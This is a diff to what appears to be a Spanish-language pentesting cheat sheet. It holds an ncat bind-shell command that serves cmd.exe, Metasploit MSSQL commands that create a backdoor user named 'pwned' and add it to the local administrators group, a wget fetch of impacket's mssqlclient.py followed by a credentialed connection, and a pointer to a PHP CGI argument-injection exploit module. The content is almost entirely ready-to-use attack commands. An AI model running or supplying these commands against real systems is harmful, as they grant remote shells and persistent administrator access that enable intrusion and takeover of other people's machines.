@@ -78,10 +78,12 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 	
 
 #MSSQL
-use auxiliary/admin/mssql/mssql_exec
-set CMD net user pwned pass000 /ADD
-net localgroup administrators pwned /ADD
-
+	use auxiliary/admin/mssql/mssql_exec
+	set CMD net user pwned pass000 /ADD
+	net localgroup administrators pwned /ADD
+	
+	wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
+	python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
 
 #WEB
 PHP 5.X probable => exploit/multi/http/php_cgi_arg_injection
